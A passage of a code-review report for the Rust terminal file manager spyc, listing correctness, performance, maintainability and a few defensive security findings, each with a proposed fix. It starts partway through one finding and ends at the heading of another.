+`Action::Take` (apply.rs:94) calls `AppState::take`, which calls `self.inventory.yank_many(&to_take)` — and `Inventory::yank` (src/state/inventory.rs:73-110) does `create_dir_all` plus a full content copy of every yanked file into the inventory cache dir, synchronously on the key-handling path inside the pure Model transition. Yanking a large file (ISO, archive, video) blocks the event loop for the whole copy. Same class of contract drift in the same module: `set_mark` (selection.rs:32) does a `marks.save()` TOML write inline from the `Action::SetMark` arm of apply. Both are OS access inside the transitions CLAUDE.md declares pure ("return effects as data — no terminal/OS access").
+
+**Fix:** Route the inventory copy through an Effect (e.g. `Effect::YankToInventory { paths }`) executed by `run_effects`, where large copies can later be moved off-thread; same for the marks persistence (an `Effect::SaveMarks` or a coalesced save in the executor). The pure arm keeps only the selection computation and the flash decision.
+
+> verifier: confirmed: Every element of the finding checks out against the actual code.
+
+(1) Code does what's claimed. /Users/derekmarshall/src/spyc/src/app/state/apply.rs:94 — `Action::Take => match self.take()` inside `AppState::apply`, which the module header itself calls "the pure `Action` dispatcher (the MVU update core)". `AppState::take` (/Users/derekmarshall/src/spyc/src/app/state/selection.rs:65-89) calls `self.inventory.yank_many(&to_take)` at line 77 exactly as cited. `Inventory::yank` (/Users/derekmarshall/src/spyc/src/state/inventory.rs:73-109) does synchronous `std::fs::metadata`, `std::fs:: …
+
+### `src/clipboard.rs:111` — Clipboard helper inherits stdout/stderr (garbles the raw-mode TUI) and leaks a zombie when stdin write fails
+`medium` · `correctness` · `platform` · **unverified**
+
+`spawn_and_pipe` (lines 110–134) spawns the helper with only `stdin(Stdio::piped())`; stdout and stderr are inherited, i.e. they point at spyc's tty while it is in raw mode on the alternate screen. Concrete failure: on Linux with `$DISPLAY` set but the X connection dead (detached SSH session, crashed compositor), `xclip` launches, prints `Error: Can't open display: :0` straight onto spyc's screen — in raw mode the LF-only output renders as stair-stepped garbage over the file list until the next full redraw. Same for any wl-copy/xsel warning output. Separately, if the helper exits before draining stdin, `stdin.write_all(...)?` at line 116 returns Err(EPIPE) and the function returns early without ever calling `child.wait()` — Rust's `Child` does not reap on Drop, so each such failed yank leaves a zombie process for the rest of the spyc session (the test at line 176 even works around this EPIPE path explicitly, confirming it's reachable).
+
+**Fix:** Add `.stdout(Stdio::null()).stderr(Stdio::null())` to the Command (or capture stderr and fold it into the returned error message so the user sees the reason in the status flash instead of on-screen garbage). On the write_all error path, wait on the child before returning (e.g. `let write_res = stdin.write_all(..); let status = child.wait()?; write_res?;`).
+
+### `src/config/mod.rs:365` — `[colors] delete_warning` is parsed but never merged — user override silently ignored
+`medium` · `correctness` · `platform` · **unverified**
+
+`ColorOverrides` declares `delete_warning` (src/config/mod.rs:245) and the theme fully supports it (`apply!(delete_warning)` in src/ui/theme.rs:139, consumed by list_view.rs:288 for the delete-confirm highlight). But `Config::merge_file`'s color-merge block (lines 353–380) copies every other ColorOverrides field via `merge_color` and omits `delete_warning`. Because `FileConfig.colors` deserializes the key without error (`deny_unknown_fields` passes — the field exists on the struct), a user who writes `[colors]\ndelete_warning = "#ff0000"` in `.spycrc.toml` gets no error, no warning, and no effect: the parsed value is dropped on the floor in merge_file and `Config.colors.delete_warning` stays None, so the theme keeps the built-in deep crimson. Concrete repro: set the key, reload config, trigger a `dd`/`R` confirmation — the highlight color is unchanged.
+
+**Fix:** Add `merge_color(&mut self.colors.delete_warning, file.colors.delete_warning);` alongside the other merge_color calls (it slots in after `prompt_prefix` at line 365). Consider replacing the hand-written per-field list with a macro or exhaustive struct-destructure so adding a field to ColorOverrides without merging it becomes a compile error rather than a silent drop.
+
+### `src/fs/finder.rs:136` — find_nested_git_repos re-walks the entire subtree raw (no gitignore, no cap, no cancellation) on every F open / :grep in a git root
+`medium` · `perf` · `fs` · **unverified**
+
+`walk_streaming` (src/fs/finder.rs:72-78) runs pass 2 unconditionally whenever the root has a `.git/` — i.e. for every `F` open in any repo, including ones with no nested clones. `find_nested_git_repos` (lines 136-173, duplicated at src/fs/grep.rs:288-324 for `:grep`) then does a full raw `read_dir` traversal of the whole subtree with gitignore disabled — only dot-dirs and 10 hardcoded names (line 137-148) are skipped — plus a `dir.join(".git").exists()` stat per directory (line 153). On a monorepo whose gitignore excludes large data/build trees not in the SKIP list (bazel-out, .terraform, vendored data dirs, per-tool caches), pass 1 correctly skips them but pass 2 descends into all of them, so the scan can dwarf the gitignore-aware walk it follows. Three compounding problems: (1) it re-runs from scratch on every picker open / grep — no caching of 'no nested repos found'; (2) it ignores `MAX_CANDIDATES` — the cap (line 115) only limits the streaming phase, not this scan; (3) it never touches `tx`, so the receiver-drop cancellation contract (lines 58-60) is dead during the scan — closing the picker after pass 1 finishes leaves the worker thread crawling the tree to completion (the `walk_streaming_stops_when_receiver_drops` test only covers the streaming phase). The owner's own workspace (parent dir with sibling clones) is exactly the layout where pass 2 always runs.
+
+**Fix:** Add a cancellation probe to the scan loop (e.g. pass an `Arc<AtomicBool>` closed-flag set when the receiver drops, or periodically attempt `tx.send(Vec::new())` every N dirs and bail on error), bound the scan with a dir-count/depth budget like `count_subdirs_capped` does for the watcher, and cache the discovered nested-repo set per root (invalidated on chdir) so repeat F opens skip the rescan. Fix both copies (finder.rs and grep.rs).
+
+### `src/fs/finder.rs:232` — rank() clones a PathBuf for every match and fully sorts the whole match set per keystroke, plus rebuilds the nucleo Matcher each call
+`medium` · `perf` · `fs` · **unverified**
+
+`rank` (src/fs/finder.rs:217-251) is the synchronous per-keystroke path: src/app/find_picker.rs:51 calls it with `limit: 200` (find_picker.rs:117), and src/app/run.rs:467-471 calls it again on every walker batch drain. For each call it (a) constructs a fresh `Matcher::new(Config::DEFAULT.match_paths())` (line 225) — nucleo's Matcher allocates internal scratch slabs; (b) clones a `PathBuf` for every matching candidate (line 240, `path.clone()`) before any truncation; (c) sorts the entire scored vec (line 245) and only then truncates to 200 (line 249). At the 100K-candidate cap with a short query (e.g. first letter typed, where most candidates match), that is ~100K PathBuf heap clones + a 100K-element sort + a Matcher rebuild on the main event loop per keystroke — easily tens of ms of avoidable work on top of the unavoidable ~100ms of scoring, i.e. visible typing jank in exactly the input-latency class the owner has chased before. The batch-drain call site makes it worse: during the walk of a 100K-file repo, batches arrive 256 at a time and each drain re-ranks the entire accumulated set, so total scoring work is O(N²/256) ≈ 20M score operations of cumulative main-thread CPU interleaved with rendering.
+
+**Fix:** Score into a `Vec<(u32 score, u32 candidate_index)>` (no clones), keep the top 200 with `select_nth_unstable_by` or a bounded min-heap instead of a full sort, and clone only the 200 winners at the end. Hoist the `Matcher` into `FindPicker` (or a thread-local) so its scratch buffers are reused across keystrokes. For the batch-drain path, consider scoring only the newly arrived batch and merging into the existing top-200 instead of re-scoring all candidates.
+
+### `src/fs/grep.rs:288` — find_nested_git_repos is a verbatim copy of finder.rs, including the 10-entry SKIP list
+`medium` · `maintainability` · `fs` · **unverified**
+
+grep.rs:288-324 is character-identical to finder.rs:136-173 (diff shows only one comment line differs), including the duplicated SKIP const of well-known noise dirs. The justifying comment (grep.rs:283-287, "Duplicated rather than shared so finder and grep can evolve independently if their skip lists diverge") doesn't hold up: the hypothetical divergence is exactly one parameter, and meanwhile any fix to the shared semantics (e.g. adding .tox/.gradle to SKIP, or handling .git files for worktrees — note finder.rs:72 and grep.rs:86 gate pass 2 on .git being a *dir*, so the two-pass logic already silently skips worktree checkouts in both copies, a bug that now must be fixed twice) has to be applied in two places. The surrounding machinery is also near-duplicated: walk_one vs search_one share the same WalkBuilder config (standard_filters/max_filesize(None)/parents(false)) and two-pass orchestration, and the spawn-thread-and-drain sync collector appears four times (finder::find_paths, finder::walk, grep::search_to_vec, grep::search).
+
+**Fix:** Extract find_nested_git_repos (taking skip: &[&str] if divergence is genuinely anticipated) plus the two-pass "walk root then nested repos" driver into a shared fs/walk.rs helper used by both finder and grep; delete the duplication-justifying comment.
+
+### `src/fs/grep.rs:353` — search_to_vec blocks on the full repo walk even after the result limit is reached
+`medium` · `correctness` · `fs` · **unverified**
+
+When `out.len() >= limit` the recv loop breaks (line 348), but `rx` stays alive while `handle.join()` waits for the worker. Since the receiver is never dropped, the cancellation contract ('next send fails and the worker exits') never fires: the worker keeps walking the whole tree (both passes, including the un-gitignored find_nested_git_repos scan) and buffering up to MAX_MATCHES=5000 matches into the channel before the function returns. The MCP search_content tool calling this with a small limit on a large monorepo stalls for the duration of a complete scan instead of returning as soon as `limit` matches are in hand — needless multi-second MCP latency plus wasted IO/memory.
+
+**Fix:** After breaking out on the limit, `drop(rx)` before `handle.join()` so the worker's next send errors and it exits promptly; keep the join to surface the regex-compile error (which is produced before any send).
+
+### `src/fs/listing.rs:137` — Listing::sort comparator allocates 2-4 Strings per comparison — ~1.5M+ allocations per sort of a 50k-entry directory, on the event loop
+`medium` · `perf` · `fs` · **unverified**
+
+The `sort_by` comparator (src/fs/listing.rs:137-158) calls `to_ascii_lowercase()` on both names inside the comparison closure for Name mode (lines 140-143), and for Ext mode allocates four Strings per comparison (lines 147-153: two lowercased extensions plus two lowercased names in the tie-break). A 50k-entry listing (the `MAX_ENTRIES` cap) does ~n·log2(n) ≈ 780K comparisons, so a single sort performs ~1.56M short-lived String allocations (~3.1M in Ext mode). This sort runs inside `Listing::read` (line 128), which executes synchronously on the event loop via `AppState::refresh_listing` (src/app/state/listing.rs:125) — itself triggered by notify watcher events, which on an active directory (builds, agents writing files) fire every few seconds — and via `chdir` (src/app/state/listing.rs:187). It also re-runs on every `S` sort-mode cycle. That is steady-state allocator churn and event-loop latency proportional to n·log n allocations on the hot path for large directories.
+
+**Fix:** Compute the case-folded key once per entry instead of per comparison: either store a `name_lower: Box<str>` (and lazily an `ext_lower`) on `Entry` at read time, or build a `Vec<(key, index)>` / use a `sort_by_cached_key`-style schwartzian transform inside `sort`. This drops allocation count from O(n log n) to O(n) per sort.
+
+### `src/fs/long_listing.rs:155` — format_long_listing does an unmemoized getpwuid/getgrgid NSS lookup per row — L on a large listing can stall seconds-to-minutes on LDAP-backed machines
+`medium` · `perf` · `fs` · **unverified**
+
+`make_long_row` (src/fs/long_listing.rs:148-191) calls `lookup_user_name(uid)` / `lookup_group_name(gid)` (lines 155-157), which hit `uzers::get_user_by_uid` / `get_group_by_gid` — i.e. `getpwuid_r`/`getgrgid_r` through NSS — once per row with no caching. `Action::LongList` runs this synchronously inside the pure `AppState::apply` on the event loop, and with no selection it long-lists every entry in the listing (src/app/state/apply.rs:308-320), i.e. up to the 50k `MAX_ENTRIES` cap → up to 100k NSS round trips. Files in one directory almost always share a handful of uids/gids, so >99.9% of these lookups are duplicates. On plain `files` nsswitch this is ~0.1-0.5s of wasted syscalls; on corporate machines where directory services back NSS (LDAP/AD via sssd or macOS Open Directory — relevant given spyc's daily users are on company laptops), each miss can be a daemon/network round trip and the stall reaches seconds to minutes with the UI frozen, since uzers does not guarantee caching.
+
+**Fix:** Memoize per invocation: build `HashMap<u32, String>` caches for uid→owner and gid→group at the top of `format_long_listing` and pass them to `make_long_row` (or use `uzers::UsersCache`, which exists for exactly this). Two lookups per distinct uid/gid instead of two per row.
+
+### `src/fs/ops.rs:52` — read_truncated caps lines but not bytes — a huge single-line file is loaded entirely into RAM on the UI thread
+`medium` · `correctness` · `fs` · **unverified**
+
+read_truncated exists specifically so files over MAX_PAGER_BYTES (5 MiB) don't get fully loaded (the comment cites a user-reported hang). But the cap is MAX_PAGER_LINES *lines*, and each reader.read_line(&mut line) at line 52 is unbounded: a multi-GB file with no newlines (minified JS/JSON bundle, JSONL export with giant records, log without terminators) is read in full into `line`/`buf`. The caller build_pager_view_for_file (src/app/pager_handler/mod.rs:309) runs synchronously on the update path, so Enter on such a file blocks the event loop and balloons memory — exactly the failure mode the byte cap was added to prevent. 5000 lines of ~1 MB each similarly loads ~5 GB despite the 5 MiB intent.
+
+**Fix:** Bound bytes as well as lines: wrap the reader in `(&mut reader).take(byte_cap)` (e.g. MAX_PAGER_BYTES) and treat hitting the byte cap as truncated, or use read_until with a per-line byte ceiling.
+
+### `src/git/blame.rs:49` — BlameModel has no size cap and clones 3 metadata Strings per line
+`medium` · `perf` · `git` · **unverified**
+
+`blame()` builds one `BlameLine` per file line, cloning `short_id`, `author`, and `date` Strings for every line (blame.rs:49-57) even though they are already deduped per-commit in `meta_cache`. There is no analogue of diff's `MAX_DIFF_LINES` (blob.rs:21, added explicitly 'so a pathological diff can't blow up memory on the render side') — a blame of a very large file (generated code, lockfiles, data files; the owner is a heavy-files user) allocates 4 heap Strings per line and the model is held for the life of the pager view. At 1M lines that is ~4M allocations and on the order of hundreds of MB counting per-String overhead, all duplicated copies of at most a handful of distinct commit strings. Build is off-thread (git_view_session), so this is memory/alloc churn rather than a UI hang — bounded but real.
+
+**Fix:** Store commit metadata once in a `Vec<CommitInfo>` on `BlameModel` and give each `BlameLine` a `u32` index (or `Arc<str>`/interned ids), and add a line cap + `truncated` flag mirroring `MAX_DIFF_LINES` so a pathological file degrades the same way a pathological diff does.
+
+### `src/git/diff_model/build.rs:89` — gd diff silently drops the deletion side of an unstaged rename
+`medium` · `correctness` · `git` · **unverified**
+
+In collect_worktree_plan, the IwItem::Rewrite arm comments "source path is lost here" and only inserts the destination as a plain Path. The comment is wrong: gix 0.84's status::index_worktree::Item::Rewrite carries `source: RewriteSource`, whose RewriteFromIndex variant has `source_rela_path` (gix-0.84.0/src/status/index_worktree.rs:368-412). Because gix's rewrite tracking consumes the source's deletion into the Rewrite item, no separate Modification(Removed) is emitted, so the deleted tracked file vanishes from the diff entirely. Verified: commit a 10-line a.txt, `mv a.txt b.txt` (no git add), then diff_head_to_worktree → model contains exactly one FileDiff `old=None new=Some("b.txt") status=Added`; a.txt appears nowhere. A user reviewing `gd` before committing cannot see that a tracked file was removed.
+
+**Fix:** In the IwItem::Rewrite arm, read the source path from the item's `source` field (RewriteSource::rela_path) and emit a WorkItem::Rename { source, dest, copy } (marking both consumed), so the pair renders as a rename like the staged case; or, if matching `git diff` output is preferred, push both source and dest into `plain` so they render as Deleted + Added.
+
+### `src/git/diff_model/build.rs:559` — Rename similarity recomputed with a second full-blob diff that gix already performed
+`medium` · `perf` · `git` · **unverified**
+
+Every rename/copy in the diff/show builders triggers a redundant full-content diff just to produce the similarity percentage: `build_tree_change_file` calls `blob_similarity(repo, *source_id, *id)` (build.rs:559), which re-reads both blobs and runs a fresh Histogram diff (blob.rs:251-264, 283-292) — but the `ChangeDetached::Rewrite` it was handed already carries `diff: Option<DiffLineStats>` with a computed `similarity: f32` field from gix's rewrite tracker (verified in gix-diff 0.64.0 src/tree_with_rewrites/change.rs:86 and src/blob/mod.rs:48-60); the field is simply discarded by the `..` pattern. Likewise `build_index_change_file` (build.rs:415) and `build_worktree_rename` (build.rs:136, via `worktree_similarity` at blob.rs:269 which additionally does a full `std::fs::read` of the dest file). Net effect: each renamed file's content is diffed three times — once by gix's rename tracking, once for the similarity number, once by `diff_kind_from_cache` for the hunks. On a rename-heavy commit of large files (a directory move) this multiplies `git show`/`gd` model-build time. Off-thread, so bounded, but pure redundant recomputation.
+
+**Fix:** For the tree path, read `similarity` from the `Rewrite` change's `DiffLineStats` instead of calling `blob_similarity`. For the index/worktree paths, derive the percentage from the hunk diff `diff_kind_from_cache` is about to run (count removals/additions from the produced hunks plus the interned input lengths) instead of running a separate diff.
+
+### `src/git/status.rs:217` — gix status-walk setup and item-decode skeleton duplicated between repo_status and collect_worktree_plan
+`medium` · `maintainability` · `git` · **unverified**
+
+`repo_status` (status.rs:217-227 platform config, 244-323 match) and `diff_model::build::collect_worktree_plan` (build.rs:52-108) both build `repo.status(gix::progress::Discard)` with identical `tree_index_track_renames(TrackRenames::Given(Rewrites::default()))` + `index_worktree_rewrites(Rewrites::default())`, then iterate the same `Item::TreeIndex(ChangeRef::{Addition,Deletion,Modification,Rewrite})` / `Item::IndexWorktree(IwItem::{Modification,DirectoryContents,Rewrite})` arms — differing only in untracked mode (`Collapsed` vs `Files`) and what each arm accumulates. The git-parity configuration rationale (the -M50% rename default, the Collapsed-vs-Files divergence note) is documented only on `repo_status`; if someone later tunes one walk (e.g. a different rename percentage or an ignore-submodules option), the other silently diverges, and the diff view and status markers would disagree about which paths changed.
+
+**Fix:** Extract a shared helper (e.g. in a small `src/git/walk.rs` or on status.rs) that builds the configured status platform given an `UntrackedFiles` mode and drives the iteration through a visitor/callback, so the parity-sensitive configuration lives in exactly one place. Alternatively, have `collect_worktree_plan` consume `repo_status`'s output where the shapes allow.
+
+### `src/git/status.rs:246` — One failed status item silently blanks git status for the whole repo
+`medium` · `correctness` · `git` · **unverified**
+
+repo_status uses `let item = item.ok()?;` inside the iterator loop (and `.ok()?` on platform/into_iter), so a single erroring item aborts the entire walk and returns None. Verified: a repo containing one unreadable (mode 000) directory returns None even though other entries (a dirty tracked file) decoded fine. The git worker (bootstrap.rs:207) then stores entries: None and AppState's git path (app/state/git.rs:118-121) returns an empty map — every git marker in the listing silently disappears for the repo, with no error shown. `git status` itself handles this fine (the porcelain backend never had this failure mode), so this is a gix-migration regression. It is also the enabling half of the worktree::remove data-loss finding.
+
+**Fix:** Replace `item.ok()?` with `let Ok(item) = item else { continue; }` (collect what decoded successfully), or accumulate the first error and surface it to the user while still returning the successful entries. At minimum distinguish "not a repo" (None) from "walk error" so callers like worktree::remove can fail closed.
+
+### `src/git/status.rs:314` — repo_status diverges from porcelain on unstaged renames (parity contract violation)
+`medium` · `correctness` · `git` · **unverified**
+
+The IwItem::Rewrite arm keys a single entry on the destination with unstaged=Renamed and drops the source's deletion. Verified against git: after committing a.txt then `mv a.txt b.txt` (no add), `git status --porcelain -unormal` reports ` D a.txt` + `?? b.txt`, while repo_status returns the single entry `StatusEntry { rela_path: "b.txt", staged: None, unstaged: Some(Renamed), untracked: false }`. This violates the function's own documented contract ("produce the same Vec<StatusEntry> as decode_porcelain does", line 181-183): b.txt's listing marker shows as a tracked rename instead of untracked, and the Deleted entry for a.txt is missing (so e.g. a parent dir whose only change is that deletion gets no dirty marker if the dest landed elsewhere). The parity-test corpus (case01-14) has no unstaged-rename case, so nothing catches it.
+
+**Fix:** Either drop `.index_worktree_rewrites(...)` from the platform config (porcelain v1 never pairs a deletion with an untracked file, so disabling matches git exactly), or decompose the Rewrite item into its porcelain shape: a Deleted entry for the source rela_path (available on the item's `source` field) plus an untracked entry for the destination. Add an unstaged-rename case to the parity corpus.
+
+### `src/git/worktree.rs:61` — worktree::list/add use gix::open (no ancestor discovery) but callers pass the browsed directory, so worktree ops fail from any repo subdirectory
+`medium` · `maintainability` · `git` · **unverified**
+
+`list` (line 61) and `add` (line 108) call `gix::open(dir)`, which only opens a repository whose root (or `.git`) is at `dir` — it does not walk up parent directories the way the `git` binary does. The app calls both with the user's current listing dir: `src/app/git_state.rs:186` (`worktree_list(&self.state.listing.dir)`) and `src/app/prompt.rs:620` (`worktree::add(&self.state.listing.dir, branch)`). So `W l` / worktree-add work at the repo root but fail ("not a repo" / "open repo: ...") when the user is browsing `repo/src/` — a behavior regression vs the pre-gix subprocess path, which inherited git's upward discovery. The doc comment on `list` (line 59: "same failure shape as the prior `git worktree list` → `None`") is inaccurate for this case: the prior subprocess succeeded from subdirectories. Note the app already computes `current_repo_root` via an ancestor walk (see discovery.rs's hot-path note), so the data to do this correctly exists.
+
+**Fix:** Either switch `list`/`add` to `gix::discover(dir)` (upward discovery, matching git's CLI semantics), or change the call sites to pass `state.git_cache.current_repo_root` instead of `listing.dir`, and fix the `list` doc comment to match whichever contract is chosen.
+
+### `src/git/worktree.rs:170` — worktree::add leaves partial on-disk state on failure, and the leftover state blocks retry
+`medium` · `maintainability` · `git` · **unverified**
+
+`add` performs its writes in sequence with no cleanup on the error path: `create_dir_all(&target)` and `create_dir_all(&admin_dir)` (lines 170-171) happen before `index_from_tree` / `checkout` / `index.write` / `write_admin_files` (lines 175-203). If any of those later steps errors (corrupt object, disk full, permission error mid-checkout), the function returns `Err` leaving (a) a non-empty `target` dir with a partial checkout and *no* `.git` gitfile — so `remove()` refuses it (`admin_dir_of` errors at line 336) and a retry of `add` for the same branch fails at the line-133 guard ("already exists and is not empty"), and (b) an orphan admin dir under `<common>/worktrees/<name>`, which makes the next `unique_admin_name` dedupe to `name1` (line 257). `resolve_or_create_branch` (line 142) may also have already written a brand-new loose branch ref that is never rolled back. Real `git worktree add` removes the worktree dir and admin dir on failure. This is a data-affecting operation in a tool with daily users; a single transient failure strands the user with directories they must clean up by hand.
+
+**Fix:** Wrap the post-`create_dir_all` steps so that on `Err` a best-effort cleanup runs: `remove_dir_all(&target)` (only if `add` created it — it may pre-exist empty), `remove_dir_all(&admin_dir)`, and optionally delete the loose ref if this call created the branch. A small guard struct with `Drop` (disarmed on success) keeps this from sprawling.
+
+### `src/key_trace.rs:39` — Key-trace log records every keystroke (incl. pane input) to a world-readable predictable file in /tmp
+`medium` · `security` · `platform` · **unverified**
+
+key_trace::init opens `/tmp/spyc-key-trace-<epoch>.log` with `OpenOptions::new().create(true).append(true)` (src/key_trace.rs:39-43) — default umask, so typically 0644 world-readable in the shared /tmp. The trace logs the literal content of every key event (`RX ... code={:?}` includes `Char('x')` per src/app/key_dispatch/mod.rs:47-55) and a printable preview of every byte sequence written to pty panes (`send_key`/`send_bytes` at src/pane/mod.rs:307,353 via `preview_bytes`). A user who enables `--key-trace` to reproduce an input bug — the documented use case is "flip the flag, reproduce, and ship the log" — and then types a sudo/ssh password into an agent or shell pane has that secret persisted world-readable in /tmp. Additionally `create(true)` without `O_EXCL`/`O_NOFOLLOW` on a to-the-second-predictable path follows pre-planted symlinks.
+
+**Fix:** Create the file with `std::os::unix::fs::OpenOptionsExt::mode(0o600)` and `create_new(true)` (retry with a suffix on collision), or write under `$XDG_RUNTIME_DIR`/`~/.cache/spyc` instead of /tmp. Consider redacting TX previews when the destination pane is in non-echo mode if that signal is available.
+
+### `src/main.rs:87` — Panic hook doesn't pop kitty keyboard-enhancement flags or alternate-scroll mode — terminal left misbehaving after a panic
+`medium` · `correctness` · `platform` · **unverified**
+
+`setup_terminal` pushes `KeyboardEnhancementFlags::DISAMBIGUATE_ESCAPE_CODES` (line 345–350) and enables DEC mode 1007 alternate-scroll (line 332). The normal exit path pops both (`restore_terminal`, lines 367–374), and the comment at lines 363–366 explicitly states that terminals which support the protocol "leave the flag set if we don't pop, which would affect any other TUI started in the same shell session." The panic hook (lines 84–93), however, only does `disable_raw_mode` + `LeaveAlternateScreen, DisableBracketedPaste, ShowMousePointer` — it never sends `PopKeyboardEnhancementFlags` or `DisableAlternateScroll`. On terminals that don't keep fully separate per-screen enhancement stacks, a spyc panic leaves disambiguate mode active in the user's shell: Esc arrives as `CSI 27u`, modified keys send `CSI u` sequences, and line editing is visibly broken until `reset`. This is exactly the failure window the hook exists to close (and the project now has daily users hitting panics occasionally).
+
+**Fix:** In the panic hook, add `PopKeyboardEnhancementFlags` and `DisableAlternateScroll` to the best-effort `execute!` (pop must be emitted before `LeaveAlternateScreen` so it applies to the alt-screen stack on spec-conforming terminals): `execute!(io::stdout(), PopKeyboardEnhancementFlags, LeaveAlternateScreen, DisableBracketedPaste, DisableAlternateScroll, ShowMousePointer)`.
+
+### `src/mcp/protocol.rs:62` — Nine doc comments detached from their functions by the verbatim mcp.rs split
+`medium` · `maintainability` · `mcp-agent` · **unverified**
+
+The 800-LoC decomposition of mcp.rs relocated functions but left their doc comments attached to the wrong items, so rustdoc/IDE hover now actively lies. Verified instances: (1) src/mcp/protocol.rs:62 — "/// Resolve context path from env var or project root." documents handle_initialize (the described fn is resolve_context_path in mcp/mod.rs:78); (2) protocol.rs:56-60 — the "── Stdio transport (spyc --mcp) ──… Proxies JSON-RPC from stdin/stdout…" section header sits above handle_initialize, but the stdio transport (run_proxy/run_direct) lives in server.rs; (3) protocol.rs:450-454 — "/// Pick the search root: prefer project_home…" documents read_lsp_message (it describes search_root in readers.rs:7); (4) src/mcp/mod.rs:62-64 — "/// Dispatch a JSON-RPC request and write the response to `w`…" dangles above `mod config;` (describes dispatch in protocol.rs:15); (5) src/mcp/server.rs:330 — "/// Status of MCP configuration for this directory." documents pid_from_sock_path (describes McpConfigStatus in config.rs:11); (6) server.rs:352-354 — "/// Ensure `.mcp.json` has the spyc entry… takes over." is merged into handle_socket_connection's doc (describes ensure_mcp_json in config.rs:121); (7) config.rs:120 — "/// Extract the PID from a socket path like `mcp-12345.sock`." documents ensure_mcp_json (describes pid_from_sock_path in server.rs:331); (8) server.rs:384 — trailing "── Protocol handlers ──" section header at EOF with nothing under it; (9) readers.rs:145 — trailing "── Framing helpers ──" header at EOF with nothing under it. This is exactly the stale-comment class the #293 comment-audit fixed elsewhere but missed here.
+
+**Fix:** One mechanical pass: move each doc comment to the function it actually describes (or delete it where the real function already carries an equivalent doc, which is true for dispatch, search_root, pid_from_sock_path, and ensure_mcp_json) and delete the two empty trailing section headers.
+
+### `src/mcp/protocol.rs:324` — get_file_content is cwd-scoped while the search tools are project_home-scoped, so spyc's own search results can't be read back
+`medium` · `correctness` · `mcp-agent` · **unverified**
+
+search_paths and search_content resolve their root via readers.rs::search_root (src/mcp/readers.rs:7), which prefers `project_home` from the context file, and both walkers strip that root from results (src/fs/finder.rs:104, src/fs/grep.rs:127 — paths returned to the agent are project_home-relative). get_file_content, however, resolves relative paths against `cwd` (protocol.rs:307) and then rejects anything whose canonical path is not under canonical cwd (protocol.rs:324). Concrete failure: spyc's cwd is a subdirectory of the project root (the normal state after navigating), the agent calls search_content, gets back e.g. "Cargo.toml" or "src/app/mod.rs" (relative to project_home), then calls get_file_content with that exact path — it resolves to <cwd>/Cargo.toml (ENOENT) or, if the agent passes the absolute path instead, is rejected with "path is outside the working directory" because it's outside cwd. The advertised search→read tool pipeline fails whenever cwd != project_home.
+
+**Fix:** Resolve get_file_content's relative paths against the same root search_root() returns (project_home, falling back to cwd), and widen the containment check to canonical project_home instead of canonical cwd, so the three tools share one root.
+
+### `src/mcp/protocol.rs:476` — read_lsp_message allocates an attacker/garbage-controlled Content-Length with no cap — alloc failure aborts the whole TUI
+`medium` · `security` · `mcp-agent` · **unverified**
+
+read_lsp_message parses Content-Length from the header and does `let mut buf = vec![0u8; len];` with no upper bound. This function services the in-process socket server threads (handle_socket_connection, src/mcp/server.rs:370): one malformed frame such as `Content-Length: 18446744073709551615` makes the allocation fail, and Rust's default allocator failure path calls handle_alloc_error → abort() — taking down the entire spyc TUI process (all live agent panes, unsaved session state), not just the connection thread. The socket is owner-only so the sender is the user's own tooling, but a buggy MCP client, a stray `nc -U`/curl against the socket, or a corrupted frame is enough; this is exactly the "panic reachable from malformed external input" class, and the blast radius is process-wide data loss.
+
+**Fix:** Cap Content-Length at a sane maximum (e.g. 16 MiB) and return an InvalidData error beyond it; also consider read_exact into a capped, incrementally-grown buffer so a large-but-legal length can't reserve memory before any bytes arrive.
+
+### `src/mcp/server.rs:84` — Stale .spyc-context-<pid>.json markers permanently shadow discovery (read-only fallback) and can attach cross-project via PID reuse
+`medium` · `correctness` · `mcp-agent` · **unverified**
+
+collect_project_pids stops at the FIRST ancestor directory containing any `.spyc-context-<pid>.json` marker and never falls through to higher ancestors ("never aggregate across levels", server.rs:84-99). Markers are only removed on clean exit (context.rs::remove_context_file); a crashed/SIGKILLed spyc leaves its marker behind forever — discover_live_socket prunes the stale *socket* (server.rs:68) but never the marker file. Two concrete failures: (1) spyc once crashed in ~/proj/sub leaving a marker there; a live spyc now runs at ~/proj; claude launched in ~/proj/sub finds only the dead PID at the sub level, all connects fail, and run() silently degrades to read-only direct mode (mod.rs:117-119) even though a live in-tree spyc exists one level up. (2) Worse: if the stale marker's PID has since been recycled by a *different* spyc instance rooted in another project, `socket_path_for(pid)` points at that instance's live socket, connect succeeds, and claude in project A attaches to spyc in project B — exactly the cross-project attachment the project-scoped discovery was built to rule out (see the comment at server.rs:24-30).
+
+**Fix:** When a candidate PID's socket is stale (ConnectionRefused/NotFound), also remove the corresponding `.spyc-context-<pid>.json` marker; if every candidate at one ancestor level is dead, continue walking to the next ancestor instead of returning None. For PID reuse, verify the connected server's project root matches (e.g. a `spyc/hello` handshake carrying project_home) before committing to proxy mode.
+
+### `src/mcp/server.rs:259` — One slow tool call (>20s) kills the entire MCP connection, and the server's searches are unbounded
+`medium` · `correctness` · `mcp-agent` · **unverified**
+
+run_proxy sets a 20 s read timeout (server.rs:193) and on timeout replies with a JSON-RPC error and `break`s out of the proxy loop entirely (server.rs:259), exiting the `spyc --mcp` process. Meanwhile the server side runs search_content/search_paths as fully synchronous, unbounded walks on the connection thread (protocol.rs:332-353 → fs::grep::search_to_vec / fs::finder::find_paths) with no internal time limit. On a large tree or cold network filesystem a single search can legitimately exceed 20 s; the agent then loses the whole spyc MCP server for the session (Claude Code does not transparently restart a stdio server mid-conversation), even though the spyc instance is healthy. The comment justifies the break as avoiding framing desync from a late reply, but the late reply is sitting in the still-open socket and could be drained instead.
+
+**Fix:** Instead of exiting, drain socket messages until the response whose `id` matches the outstanding request arrives (discarding or forwarding stale ones), or give the server its own per-request budget below 20 s so it always answers (truncated results) before the proxy gives up.
+
+### `src/pane/mod.rs:472` — scroll_offset desyncs from vt100's clamped scrollback, making scroll-down appear dead after 'g' or over-scrolling up
+`medium` · `correctness` · `pane-pty` · **unverified**
+
